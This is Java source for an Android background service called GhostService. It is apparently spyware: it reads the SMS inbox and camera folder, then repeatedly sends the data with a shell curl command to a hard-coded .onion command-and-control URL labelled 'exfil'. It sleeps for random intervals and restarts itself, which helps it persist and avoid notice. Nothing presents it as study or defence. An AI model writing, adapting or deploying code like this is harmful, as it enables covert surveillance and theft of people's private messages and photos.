package com.pwx.ghost;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.util.Random;

public class GhostService extends Service {
    private static final String C2_URL = "http://mxsyhzt2ytqa6vmwslkd4hcsbqgf22fhgllzkprx2453w7xejkhgjgyd.onion:8080/exfil";
    private static final String TAG = "GhostService";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (true) {
                try {
                    String sms = getSMS();
                    String photos = getPhotos();
                    String payload = "sms=" + sms + "&photos=" + photos;
                    Runtime.getRuntime().exec(new String[]{
                        "sh", "-c",
                        "curl -m 15 -d '" + payload + "' '" + C2_URL + "' >/dev/null 2>&1"
                    });
                    Thread.sleep(300000 + new Random().nextInt(600000));
                } catch (Exception e) {
                    Log.e(TAG, "Exfil failed", e);
                }
            }
        }).start();
        return START_STICKY;
    }

    private String getSMS() {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, null);
            if (c != null && c.moveToFirst()) {
                return c.getString(c.getColumnIndex("body"));
            }
        } catch (Exception ignored) {}
        return "none";
    }

    private String getPhotos() {
        try {
            File dcim = new File("/sdcard/DCIM/Camera");
            File[] files = dcim.listFiles();
            if (files != null && files.length > 0) {
                return files[0].getName();
            }
        } catch (Exception ignored) {}
        return "none";
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}